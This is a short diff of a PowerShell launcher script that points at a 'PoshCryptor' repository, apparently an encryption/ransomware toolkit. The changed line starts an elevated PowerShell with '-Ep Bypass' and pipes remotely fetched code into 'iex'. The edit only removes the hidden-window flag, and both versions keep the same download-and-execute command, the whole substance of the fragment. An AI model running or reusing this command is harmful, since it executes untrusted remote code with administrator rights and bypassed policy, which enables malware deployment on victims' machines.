@@ -169,7 +169,7 @@ $PoshcryptURL = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main"
             }
 
             if (($Option -eq '4') -or ($Option -eq '30') -or ($Option -eq '32') -or ($Option -eq '16')){
-                Start-Process PowerShell.exe -ArgumentList ("-Ep Bypass -W Hidden -C `$DLurl = `'$DLurl`' ; irm $url | iex") -Verb RunAs
+                Start-Process PowerShell.exe -ArgumentList ("-Ep Bypass -C `$DLurl = `'$DLurl`' ; irm $url | iex") -Verb RunAs
                 break
             }
 
